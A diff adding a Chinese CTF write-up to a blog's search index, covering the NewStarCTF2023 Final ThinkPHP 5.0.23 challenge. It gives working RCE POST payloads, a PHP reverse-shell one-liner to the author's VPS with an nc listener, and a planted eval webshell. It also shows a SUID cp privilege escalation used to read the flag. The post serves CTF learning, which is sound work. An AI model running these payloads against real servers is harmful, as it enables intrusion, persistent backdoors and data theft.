@@ -1090,4 +1090,59 @@ The little girl was so happy that she had been able ...
         <tag>密码学</tag>
       </tags>
   </entry>
+  <entry>
+    <title>【NewStarCTF2023】Final thinkphp 漏洞与提权</title>
+    <url>/2023/11/20/newstarctf2023-Final/</url>
+    <content><![CDATA[<h1 id="【NewStarCTF2023】Final-thinkphp-漏洞与提权"><a href="#【NewStarCTF2023】Final-thinkphp-漏洞与提权" class="headerlink" title="【NewStarCTF2023】Final thinkphp 漏洞与提权"></a>【NewStarCTF2023】Final thinkphp 漏洞与提权</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>打开靶机后, 是一个 thinkphp 的默认页面, 所以很有可能就是挖掘 thinkphp 的漏洞, 先在路径上输入一些默认参数查看其版本号.</p>
+<p><img src="/2023/11/20/newstarctf2023-Final/image.png"></p>
+<p>可以看到是 ThinkPHP V5.0.23.</p>
+<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>去谷歌搜索 ThinkPHP V5.0.23 漏洞, 发现有 RCE 漏洞,用 POST 构造请求参数为 <code>/?s=captcha</code> 构造的 payload 为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</span><br></pre></td></tr></table></figure>
+
+<p>这边的用法是 <code>filter[]</code> 参数中输入要执行的命令类型,<code>server[REQUEST_METHOD]</code> 里输入要执行命令的参数. </p>
+<p>构造 payload 发送后没有回显, 说明很有可能把 system 给禁止了, 所以构造下面这个 payload 看看他的 phpinfo</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=phpinfo&amp;method=get&amp;server[REQUEST_METHOD]=5</span><br></pre></td></tr></table></figure>
+
+<p>看到了他把 <code>system</code> 命令给禁用了:</p>
+<p><img src="/2023/11/20/newstarctf2023-Final/image-2.png"></p>
+<p>所以这里使用其他的命令去绕过, 比如 <code>exec</code>, <code>passthru</code></p>
+<p>构造 payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=passthru&amp;method=get&amp;server[REQUEST_METHOD]=ls /</span><br></pre></td></tr></table></figure>
+
+<p>这样能够看到 ls 后的内容, 但是这里去 cat flag 的时候发现读不出来东西, 先弹个 shell, 构造 payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=passthru&amp;method=get&amp;server[REQUEST_METHOD]=php -r &#x27;$sock=fsockopen(&quot;公网ip&quot;, 监听端口);exec(&quot;sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>vps 上使用</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nc -lvnp 端口</span><br></pre></td></tr></table></figure>
+
+<p>成功反弹 shell, 然后输入命令</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ls -la /</span><br></pre></td></tr></table></figure>
+
+<p>发现 flag 文件设置了高权限可读, 所以这里要想办法提权获取到文件.</p>
+<p><img src="/2023/11/20/newstarctf2023-Final/image-3.png"></p>
+<p>调用命令查看一下高权限的操作</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm -u=s -<span class="built_in">type</span> f <span class="number">2</span>&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/20/newstarctf2023-Final/image-4.png"></p>
+<p>发现 <code>cp</code> 命令是高权限操作, 但是我在提权过程中发现由于 用户的权限太低, 环境变量用不了, 又不能使用 <code>sudo</code> 命令, 而且也查看不了定时任务, 根本没办法用反弹的 shell 进行提权.</p>
+<p>由于 thinkphp 那个漏洞似乎是可以写入一句话木马的, 所以尝试去写入一句话木马, 把输出流绑定到木马文件上, 然后用蚁剑链接, 用 <code>cp</code>　命令把文件内容复制到输出流上提权读取文件, 构造 payload 为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=exec&amp;method=get&amp;server[REQUEST_METHOD]=echo &#x27;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&#x27; &gt; /var/www/public/shell.php</span><br></pre></td></tr></table></figure>
+
+<p>然后以 <code>shell.php</code> 作为路径, <code>cmd</code>作为链接密码, 即可 getshell</p>
+<p>然后在蚁剑命令终端中, 尝试用 <code>cp</code> 命令将文件内容复制到输出流 <code>/dev/stdout</code></p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">cp /flag_dd3f6380aa0d /dev/stdout</span><br></pre></td></tr></table></figure>
+
+<p>最后获得 flag.</p>
+<p><img src="/2023/11/20/newstarctf2023-Final/image-1.png"></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>提权</tag>
+        <tag>反弹 shell</tag>
+        <tag>thinkphp</tag>
+      </tags>
+  </entry>
 </search>
